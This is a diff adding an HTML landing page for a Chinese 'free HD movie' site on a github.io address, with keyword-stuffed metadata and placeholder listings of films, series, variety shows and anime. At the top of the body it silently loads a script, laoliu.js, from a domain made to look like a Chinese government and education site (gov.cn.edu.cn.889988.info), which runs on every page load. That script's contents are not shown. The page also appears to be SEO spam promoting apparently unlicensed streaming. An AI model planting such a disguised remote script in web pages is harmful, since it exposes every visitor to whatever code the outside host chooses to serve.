@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>放放电影网 - 免费高清电影在线观看</title>
+<meta name="description" content="放放电影网(https://fangfangdianyingwang-h5.github.io)提供最新电影、热播电视剧、综艺、动漫在线观看，免费高清无广告，尽在放放电影网。">
+<meta name="keywords" content="放放电影网,电影,电视剧,综艺,动漫,在线观看,免费电影">
+<meta name="author" content="放放电影网">
+<meta name="robots" content="index,follow">
+<meta name="msvalidate.01" content="BING_VERIFICATION_CODE" />
+<meta property="og:title" content="放放电影网 - 免费高清电影在线观看">
+<meta property="og:description" content="放放电影网提供最新电影、电视剧、综艺、动漫在线观看，免费高清无广告。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://fangfangdianyingwang-h5.github.io">
+<meta property="og:site_name" content="放放电影网">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "放放电影网",
+  "url": "https://fangfangdianyingwang-h5.github.io",
+  "description": "免费高清电影在线观看平台",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://fangfangdianyingwang-h5.github.io#search={search_term_string}",
+    "query-input": "required name=search_term_string"
+  }
+}
+</script>
+<style>
+/* ===== 全局 ===== */
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  font-family: "Helvetica Neue", "PingFang SC", "Microsoft YaHei", sans-serif;
+  background: #ffffff;
+  color: #1a1a1a;
+  line-height: 1.8;
+  overflow-x: hidden;
+}
+
+a { text-decoration: none; color: inherit; transition: all 0.3s; }
+
+/* ===== 顶栏 ===== */
+.top-strip {
+  background: #1a1a1a;
+  color: #ccc;
+  text-align: center;
+  padding: 8px 15px;
+  font-size: 12px;
+  letter-spacing: 1px;
+}
+
+/* ===== 导航 ===== */
+.navbar {
+  position: sticky;
+  top: 0;
+  z-index: 999;
+  background: #fff;
+  border-bottom: 1px solid #eee;
+}
+
+.nav-body {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 0 20px;
+  height: 60px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+.brand {
+  font-size: 22px;
+  font-weight: 900;
+  letter-spacing: -0.5px;
+}
+
+.brand b { color: #e74c3c; }
+
+.nav-list {
+  display: flex;
+  list-style: none;
+  gap: 28px;
+}
+
+.nav-list a {
+  font-size: 14px;
+  font-weight: 500;
+  color: #555;
+  position: relative;
+}
+
+.nav-list a:hover { color: #e74c3c; }
+
+.nav-list a::after {
+  content: '';
+  position: absolute;
+  bottom: -4px;
+  left: 0;
+  width: 0;
+  height: 2px;
+  background: #e74c3c;
+  transition: width 0.3s;
+}
+
+.nav-list a:hover::after { width: 100%; }
+
+.nav-toggle {
+  display: none;
+  background: none;
+  border: none;
+  font-size: 24px;
+  cursor: pointer;
+  color: #333;
+}
+
+/* ===== Hero ===== */
+.hero {
+  padding: 80px 20px 70px;
+  text-align: center;
+  border-bottom: 1px solid #f0f0f0;
+}
+
+.hero-inner {
+  max-width: 680px;
+  margin: 0 auto;
+}
+
+.hero-label {
+  display: inline-block;
+  border: 1px solid #e74c3c;
+  color: #e74c3c;
+  padding: 4px 16px;
+  border-radius: 20px;
+  font-size: 12px;
+  font-weight: 600;
+  margin-bottom: 20px;
+  letter-spacing: 1px;
+}
+
+.hero h1 {
+  font-size: clamp(30px, 6vw, 52px);
+  font-weight: 900;
+  line-height: 1.2;
+  margin-bottom: 18px;
+  letter-spacing: -1px;
+}
+
+.hero h1 span { color: #e74c3c; }
+
+.hero-desc {
+  font-size: clamp(14px, 3vw, 17px);
+  color: #777;
+  margin-bottom: 30px;
+}
+
+.hero-link {
+  display: inline-block;
+  background: #1a1a1a;
+  color: #fff;
+  padding: 12px 32px;
+  border-radius: 4px;
+  font-size: 14px;
+  font-weight: 500;
+}
+
+.hero-link:hover { background: #e74c3c; color: #fff; }
+
+/* ===== 通用区块 ===== */
+.container {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 60px 20px;
+}
+
+.section-head {
+  margin-bottom: 40px;
+  display: flex;
+  align-items: end;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  gap: 10px;
+}
+
+.section-head h2 {
+  font-size: clamp(22px, 4vw, 30px);
+  font-weight: 800;
+  letter-spacing: -0.5px;
+}
+
+.section-head h2 span { color: #e74c3c; }
+
+.section-head .more {
+  font-size: 13px;
+  color: #999;
+  border-bottom: 1px solid #ddd;
+  padding-bottom: 2px;
+}
+
+.section-head .more:hover { color: #e74c3c; border-color: #e74c3c; }
+
+/* ===== 栏目一：电影 - 网格 ===== */
+.film-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+  gap: 24px;
+}
+
+.film-cell {
+  border: 1px solid #eee;
+  border-radius: 4px;
+  overflow: hidden;
+  transition: all 0.3s;
+  cursor: pointer;
+}
+
+.film-cell:hover {
+  border-color: #e74c3c;
+  box-shadow: 0 8px 25px rgba(231,76,60,0.1);
+}
+
+.film-cover {
+  height: 240px;
+  background: #f8f8f8;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 48px;
+  border-bottom: 1px solid #eee;
+}
+
+.film-info {
+  padding: 14px;
+}
+
+.film-info h3 {
+  font-size: 14px;
+  font-weight: 700;
+  margin-bottom: 4px;
+}
+
+.film-info p {
+  font-size: 12px;
+  color: #aaa;
+}
+
+/* ===== 栏目二：电视剧 - 左右布局 ===== */
+.tv-section {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 24px;
+}
+
+.tv-block {
+  border: 1px solid #eee;
+  border-radius: 4px;
+  padding: 24px;
+  transition: border-color 0.3s;
+}
+
+.tv-block:hover { border-color: #e74c3c; }
+
+.tv-block h3 {
+  font-size: 17px;
+  font-weight: 700;
+  margin-bottom: 10px;
+}
+
+.tv-block p {
+  font-size: 13px;
+  color: #777;
+  line-height: 1.7;
+  margin-bottom: 12px;
+}
+
+.tv-block .ep {
+  display: inline-block;
+  background: #f5f5f5;
+  color: #e74c3c;
+  padding: 3px 12px;
+  border-radius: 3px;
+  font-size: 11px;
+  font-weight: 600;
+}
+
+/* ===== 栏目三：综艺 - 列表线 ===== */
+.show-list {
+  border-top: 1px solid #eee;
+}
+
+.show-line {
+  display: flex;
+  align-items: center;
+  padding: 18px 0;
+  border-bottom: 1px solid #f5f5f5;
+  transition: padding-left 0.3s;
+}
+
+.show-line:hover { padding-left: 12px; }
+
+.show-line .no {
+  font-size: 20px;
+  font-weight: 900;
+  color: #ddd;
+  width: 50px;
+  flex-shrink: 0;
+}
+
+.show-line:hover .no { color: #e74c3c; }
+
+.show-line h3 {
+  font-size: 15px;
+  font-weight: 700;
+  flex: 1;
+}
+
+.show-line span {
+  font-size: 12px;
+  color: #aaa;
+  margin-left: 15px;
+}
+
+/* ===== 栏目四：动漫 - 标签云 ===== */
+.anime-cloud {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 14px;
+}
+
+.anime-tag {
+  border: 1px solid #e0e0e0;
+  padding: 14px 22px;
+  border-radius: 50px;
+  font-size: 14px;
+  font-weight: 600;
+  color: #444;
+  transition: all 0.3s;
+}
+
+.anime-tag:hover {
+  background: #e74c3c;
+  border-color: #e74c3c;
+  color: #fff;
+  transform: translateY(-2px);
+}
+
+.anime-tag small {
+  display: block;
+  font-size: 11px;
+  font-weight: 400;
+  opacity: 0.7;
+  margin-top: 2px;
+}
+
+/* ===== 栏目五：关于 ===== */
+.about-area {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 40px;
+  align-items: start;
+}
+
+.about-text p {
+  font-size: 14px;
+  color: #666;
+  margin-bottom: 14px;
+  line-height: 1.9;
+}
+
+.about-text strong { color: #e74c3c; }
+
+.about-facts {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 16px;
+}
+
+.fact {
+  border: 1px solid #eee;
+  padding: 24px 18px;
+  text-align: center;
+  border-radius: 4px;
+}
+
+.fact .n {
+  font-size: 30px;
+  font-weight: 900;
+  color: #1a1a1a;
+}
+
+.fact .n span { color: #e74c3c; }
+
+.fact .l {
+  font-size: 12px;
+  color: #aaa;
+  margin-top: 6px;
+}
+
+/* ===== 页脚 ===== */
+.footer {
+  background: #1a1a1a;
+  color: #888;
+  padding: 50px 20px 25px;
+}
+
+.footer-body {
+  max-width: 1200px;
+  margin: 0 auto;
+  text-align: center;
+}
+
+.footer-brand {
+  font-size: 24px;
+  font-weight: 900;
+  color: #fff;
+  margin-bottom: 16px;
+}
+
+.footer-brand b { color: #e74c3c; }
+
+.footer-links {
+  display: flex;
+  justify-content: center;
+  gap: 24px;
+  margin-bottom: 24px;
+  flex-wrap: wrap;
+}
+
+.footer-links a {
+  font-size: 13px;
+  color: #aaa;
+}
+
+.footer-links a:hover { color: #e74c3c; }
+
+.footer-text {
+  font-size: 12px;
+  line-height: 2;
+  border-top: 1px solid #333;
+  padding-top: 20px;
+}
+
+.footer-text a { color: #e74c3c; }
+
+/* ===== 响应式 ===== */
+@media (max-width: 768px) {
+  .nav-list {
+    display: none;
+    position: absolute;
+    top: 60px;
+    left: 0;
+    right: 0;
+    background: #fff;
+    flex-direction: column;
+    padding: 20px;
+    border-bottom: 1px solid #eee;
+    gap: 16px;
+  }
+
+  .nav-list.open { display: flex; }
+
+  .nav-toggle { display: block; }
+
+  .tv-section { grid-template-columns: 1fr; }
+
+  .about-area { grid-template-columns: 1fr; }
+
+  .film-grid { grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 14px; }
+
+  .film-cover { height: 190px; }
+
+  .show-line .no { width: 36px; font-size: 16px; }
+
+  .anime-tag { padding: 12px 18px; font-size: 13px; }
+}
+
+@media (max-width: 480px) {
+  .hero { padding: 50px 15px 50px; }
+
+  .container { padding: 40px 15px; }
+
+  .film-grid { grid-template-columns: repeat(2, 1fr); }
+
+  .about-facts { grid-template-columns: 1fr; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 顶栏 -->
+<div class="top-strip">放放电影网 — 免费 · 高清 · 无广告</div>
+
+<!-- 导航 -->
+<header class="navbar">
+  <div class="nav-body">
+    <div class="brand">放放<b>电影网</b></div>
+    <ul class="nav-list" id="navList">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#movies">电影</a></li>
+      <li><a href="#tv">剧集</a></li>
+      <li><a href="#shows">综艺</a></li>
+      <li><a href="#anime">动漫</a></li>
+      <li><a href="#about">关于</a></li>
+    </ul>
+    <button class="nav-toggle" id="navToggle">☰</button>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="hero-inner">
+    <div class="hero-label">FANG FANG MOVIE</div>
+    <h1>放放电影网<br>海量影视 <span>免费看</span></h1>
+    <p class="hero-desc">每日更新最新院线大片、热播剧集、综艺动漫，高清画质，极速播放，无需注册，完全免费。</p>
+    <a href="https://fangfangdianyingwang-h5.github.io" class="hero-link">🌐 fangfangdianyingwang-h5.github.io</a>
+  </div>
+</section>
+
+<!-- 栏目一：电影 -->
+<section class="container" id="movies">
+  <div class="section-head">
+    <h2>最新<span>电影</span></h2>
+    <a href="#" class="more">查看更多 →</a>
+  </div>
+  <div class="film-grid">
+    <div class="film-cell">
+      <div class="film-cover">🎬</div>
+      <div class="film-info"><h3>流浪地球3</h3><p>科幻 / 9.2分</p></div>
+    </div>
+    <div class="film-cell">
+      <div class="film-cover">🎥</div>
+      <div class="film-info"><h3>封神演义·终章</h3><p>动作 / 8.8分</p></div>
+    </div>
+    <div class="film-cell">
+      <div class="film-cover">🎞️</div>
+      <div class="film-info"><h3>唐人街探案5</h3><p>喜剧 / 8.5分</p></div>
+    </div>
+    <div class="film-cell">
+      <div class="film-cover">📽️</div>
+      <div class="film-info"><h3>长津湖·和平</h3><p>战争 / 9.5分</p></div>
+    </div>
+    <div class="film-cell">
+      <div class="film-cover">🎦</div>
+      <div class="film-info"><h3>独行月球2</h3><p>科幻 / 8.3分</p></div>
+    </div>
+    <div class="film-cell">
+      <div class="film-cover">📹</div>
+      <div class="film-info"><h3>满江红·侠影</h3><p>悬疑 / 8.7分</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：电视剧 -->
+<section class="container" id="tv">
+  <div class="section-head">
+    <h2>热播<span>剧集</span></h2>
+    <a href="#" class="more">查看更多 →</a>
+  </div>
+  <div class="tv-section">
+    <div class="tv-block">
+      <h3>庆余年·第三季</h3>
+      <p>范闲重返京都，权谋斗争再起波澜。张若昀、李沁主演年度大剧，剧情跌宕起伏，人物刻画深刻。</p>
+      <span class="ep">更新至32集</span>
+    </div>
+    <div class="tv-block">
+      <h3>三体·黑暗森林</h3>
+      <p>根据刘慈欣同名小说改编，人类面对三体文明的终极抉择，宏大世界观震撼呈现。</p>
+      <span class="ep">更新至18集</span>
+    </div>
+    <div class="tv-block">
+      <h3>繁花·续章</h3>
+      <p>黄河路上的商战风云，胡歌、马伊琍再续传奇，画面精美，剧情张力十足。</p>
+      <span class="ep">更新至24集</span>
+    </div>
+    <div class="tv-block">
+      <h3>琅琊榜·归来</h3>
+      <p>梅长苏智斗奸佞，守护大梁江山的全新篇章，权谋与情感交织的经典之作。</p>
+      <span class="ep">更新至12集</span>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：综艺 -->
+<section class="container" id="shows">
+  <div class="section-head">
+    <h2>综艺<span>娱乐</span></h2>
+    <a href="#" class="more">查看更多 →</a>
+  </div>
+  <div class="show-list">
+    <div class="show-line">
+      <div class="no">01</div>
+      <h3>奔跑吧·2026</h3>
+      <span>户外竞技 / 浙江卫视</span>
+    </div>
+    <div class="show-line">
+      <div class="no">02</div>
+      <h3>歌手·巅峰之战</h3>
+      <span>音乐竞演 / 湖南卫视</span>
+    </div>
+    <div class="show-line">
+      <div class="no">03</div>
+      <h3>向往的生活·第七季</h3>
+      <span>慢生活 / 湖南卫视</span>
+    </div>
+    <div class="show-line">
+      <div class="no">04</div>
+      <h3>极限挑战·宝藏行</h3>
+      <span>公益探索 / 东方卫视</span>
+    </div>
+    <div class="show-line">
+      <div class="no">05</div>
+      <h3>中国好声音·2026</h3>
+      <span>音乐选秀 / 浙江卫视</span>
+    </div>
+    <div class="show-line">
+      <div class="no">06</div>
+      <h3>快乐再出发·第二季</h3>
+      <span>音乐旅行 / 芒果TV</span>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：动漫 -->
+<section class="container" id="anime">
+  <div class="section-head">
+    <h2>动漫<span>专区</span></h2>
+    <a href="#" class="more">查看更多 →</a>
+  </div>
+  <div class="anime-cloud">
+    <a href="#" class="anime-tag">斗罗大陆·终章 <small>热血 · 120集</small></a>
+    <a href="#" class="anime-tag">斗破苍穹·年番 <small>玄幻 · 280集</small></a>
+    <a href="#" class="anime-tag">海贼王·最终章 <small>冒险 · 1120集</small></a>
+    <a href="#" class="anime-tag">咒术回战·第三季 <small>热血 · 24集</small></a>
+    <a href="#" class="anime-tag">鬼灭之刃·无限城 <small>热血 · 18集</small></a>
+    <a href="#" class="anime-tag">凡人修仙传 <small>仙侠 · 156集</small></a>
+    <a href="#" class="anime-tag">间谍过家家·第二季 <small>搞笑 · 25集</small></a>
+    <a href="#" class="anime-tag">进击的巨人·终章 <small>热血 · 完结</small></a>
+  </div>
+</section>
+
+<!-- 栏目五：关于 -->
+<section class="container" id="about">
+  <div class="section-head">
+    <h2>关于<span>我们</span></h2>
+  </div>
+  <div class="about-area">
+    <div class="about-text">
+      <p><strong>放放电影网</strong>（https://fangfangdianyingwang-h5.github.io）是一个专注于提供高清电影、电视剧、综艺、动漫在线观看的免费影视平台。</p>
+      <p>我们致力于为用户提供最优质的观影体验，每日更新最新影视资源，涵盖国产剧、美剧、韩剧、日剧等多个分类，无需注册，完全免费。</p>
+      <p>关键词：放放电影网、免费电影、在线观看、高清影视、好剧推荐</p>
+    </div>
+    <div class="about-facts">
+      <div class="fact"><div class="n">10<span>K+</span></div><div class="l">影视资源</div></div>
+      <div class="fact"><div class="n">500<span>W+</span></div><div class="l">累计用户</div></div>
+      <div class="fact"><div class="n">24<span>h</span></div><div class="l">每日更新</div></div>
+      <div class="fact"><div class="n">100<span>%</span></div><div class="l">免费观看</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer class="footer">
+  <div class="footer-body">
+    <div class="footer-brand">放放<b>电影网</b></div>
+    <div class="footer-links">
+      <a href="#home">首页</a>
+      <a href="#movies">电影</a>
+      <a href="#tv">剧集</a>
+      <a href="#shows">综艺</a>
+      <a href="#anime">动漫</a>
+      <a href="#about">关于</a>
+    </div>
+    <div class="footer-text">
+      <p>网站名称：放放电影网 | 网址：<a href="https://fangfangdianyingwang-h5.github.io">https://fangfangdianyingwang-h5.github.io</a></p>
+      <p>© 2026 放放电影网 保留所有权利 | 关键词：放放电影网 免费高清电影在线观看</p>
+      <p>本网站仅提供影视信息展示服务，资源来源于互联网公开内容。</p>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('navToggle').addEventListener('click', function() {
+  document.getElementById('navList').classList.toggle('open');
+});
+
+document.querySelectorAll('a[href^="#"]').forEach(function(a) {
+  a.addEventListener('click', function(e) {
+    e.preventDefault();
+    var target = document.querySelector(this.getAttribute('href'));
+    if (target) {
+      target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      document.getElementById('navList').classList.remove('open');
+    }
+  });
+});
+</script>
+
+</body>
+</html>
